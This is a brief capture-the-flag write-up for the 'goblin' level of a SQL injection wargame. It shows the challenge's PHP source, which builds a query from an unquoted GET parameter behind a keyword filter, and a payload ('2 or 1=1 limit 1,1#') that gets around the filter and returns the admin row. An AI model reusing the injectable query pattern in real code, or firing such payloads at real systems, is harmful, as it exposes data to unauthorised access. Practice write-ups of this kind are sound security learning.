```php <?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```

explain:

- check prob, ., _, (), ', ", ` 
- /..../i : ignore lower and upper case

Solve: 

1 is `no` of `guest` so, we just negate this query `where id= 'guest'`

query sample: `select id from prob_goblin where id='guest' and no= 2 or id=admin`

Let try using query `select id from prob_goblin where id='guest' and no= 2 or 1=1`, 
web server return `true`, `guest` called

so we all know, `or 1=1` is exactly query we need, so let extract data on first column 

(according my experiment `admin` always on top table)

so, query to solv this chall is 

Payload: `select id from prob_goblin where id='guest' and no= 2 or 1=1 limit 1,1#`

